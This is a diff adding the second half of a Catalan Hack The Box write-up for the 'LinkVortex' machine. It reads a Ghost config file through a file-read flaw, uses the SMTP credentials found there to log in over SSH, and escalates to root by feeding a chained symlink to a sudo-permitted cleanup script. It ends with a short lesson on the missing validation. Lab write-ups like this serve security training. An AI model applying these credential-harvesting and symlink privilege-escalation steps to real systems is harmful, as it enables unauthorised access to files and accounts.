@@ -811,7 +811,163 @@ node:x:1000:1000::/home/node:/bin/bash
 file> 
 ````
 
-Sembla que ha funcionat, però no trobo res a través d'això. 
+Anirem a internet a veure si trobem on hi ha els fitxers de configuració per defecte de Ghost. Un cop feta la cerca, he trobat que hem de buscar el fitxer `config.production.json` i allà és molt probable que trobem les credencials per connectar amb una base de dades o bé les credencials per enviament de correus podent trobar les credencials també. Aquesta informació l'he tret de la documentació oficial de Ghost https://ghost.org/docs/config/ :
 
-MÀQUINA EN PROCÉS.
+![[Pasted image 20241221193105.png]]
+
+![[Pasted image 20241221193126.png]]
+
+Per tant la clau és trobar aquest fitxer, ara per tant a veure si trobem a internet a quin directori per defecte es troba. A internet he vist que podria estar aquí però no ha funcionat :
+```
+file> /var/www/ghost/config.production.json       
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Not Found</pre>
+</body>
+</html>
+file> 
+
+```
+
+He seguit buscant i he trobat a un repositori de GitHub que en un docker està a la ruta ``/var/lib/ghost/content`` la configuració, per tant he buscat aquí o bé a /var/lib/ghost/ i hi ha hagut més sort:
+
+```
+file> /var/lib/ghost/config.production.json
+{
+  "url": "http://localhost:2368",
+  "server": {
+    "port": 2368,
+    "host": "::"
+  },
+  "mail": {
+    "transport": "Direct"
+  },
+  "logging": {
+    "transports": ["stdout"]
+  },
+  "process": "systemd",
+  "paths": {
+    "contentPath": "/var/lib/ghost/content"
+  },
+  "spam": {
+    "user_login": {
+        "minWait": 1,
+        "maxWait": 604800000,
+        "freeRetries": 5000
+    }
+  },
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+      }
+    }
+}
+file> 
+
+```
+
+Ara ja tenim unes credencials d'usuari amb el seu nom i contrasenya que utilitzarem per connectar-nos, ara sí, per ssh:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh bob@linkvortex.htb                       
+The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
+ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
+bob@linkvortex.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sun Dec 22 08:16:25 2024 from 10.10.16.40
+bob@linkvortex:~$ 
+```
+
+Ara obtenim la user flag:
+
+```
+bob@linkvortex:~$ whoami
+bob
+bob@linkvortex:~$ ls -lah
+total 28K
+drwxr-x--- 3 bob  bob  4.0K Dec 22 08:19 .
+drwxr-xr-x 3 root root 4.0K Nov 30 10:07 ..
+lrwxrwxrwx 1 root root    9 Apr  1  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 bob  bob   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 bob  bob  3.7K Jan  6  2022 .bashrc
+drwx------ 2 bob  bob  4.0K Nov  1 08:40 .cache
+-rw-r--r-- 1 bob  bob   807 Jan  6  2022 .profile
+lrwxrwxrwx 1 bob  bob    14 Dec 22 08:19 hyh.txt -> /root/root.txt
+-rw-r----- 1 root bob    33 Dec 22 07:23 user.txt
+bob@linkvortex:~$ cat user.txt 
+c0cc57ae11b3e5c9f1f24c8bc676b7c8
+```
+
+Ara el següent pas és escalar privilegis per poder obtenir la flag de root. Mirem el que l'usuari bob pot fer amb privilegis de root:
+
+```
+bob@linkvortex:~$ sudo -l
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+bob@linkvortex:~$ 
+```
+
+Veiem que l'script **`/opt/ghost/clean_symlink.sh`** es pot executar com a root amb qualsevol fitxer amb extensió `.png` i sense necessitat d'introduir una contrasenya. Per tant sembla clar que és això el que hem d'explotar.
+
+Creearem un enllaç símbolic que és com un "accés directe". És un fitxer que apunta a un altre fitxer o directori i amb això el que farem és "enganyar" perquè es treballi amb un fitxer diferent del que s'esperen. Això ho fem creant un enllaç simbòlic a `root.txt` que es troba al directori `/root` (com sempre a HTB), accessible només per l'usuari **root**. La comanda per fer-ho i que crea un enllaç simbòlic anomenat `wizard.txt` que apunta al fitxer `root.txt`.:
+
+`bob@linkvortex:~$ ln -s /root/root.txt wizard.txt
+`
+
+Ara toca convertir wizard.txt en un fitxer .png ja que la vulnerabilitat de l'script permet executar-lo amb qualsevol fitxer .png, per tant creem un altre enllaç simbòlic que associa `wizard.txt` amb un fitxer `.png`:
+
+`bob@linkvortex:~$ ln -s /home/bob/wizard.txt wizard.png
+`
+Ara toca executar l'script vulnerable que  executa l'script amb permisos de root i li passa wizard.png com a argument i com que wizard.png apunta indirectament a `/root/root.txt`, l'script processa el contingut de root.txt com si fos un fitxer .png i  l'execució de l'script ens permet veureel contingut del fitxer root.txt, que conté la root flag:
+
+```
+bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/wizard.png
+Link found [ /home/bob/wizard.png ] , moving it to quarantine
+Content:
+e579d593e27565a1ce2039b9e85e53ae
+```
+
+I ja tenim al root flag!!
+
+Fent un repàs i com a conclusions, veiem que aquest atac funciona per dues raons principals:
+
+-Manca de validacions a l'script:
+
+- L'script no comprova que el fitxer `.png` sigui realment un fitxer d'imatge.
+- Això permet utilitzar enllaços simbòlics per enganyar-lo.
+
+-Permisos inadequats:
+
+- L'usuari bob pot executar l'script amb privilegis de root sense contrasenya, cosa que li permet accedir a fitxers restringits.
 
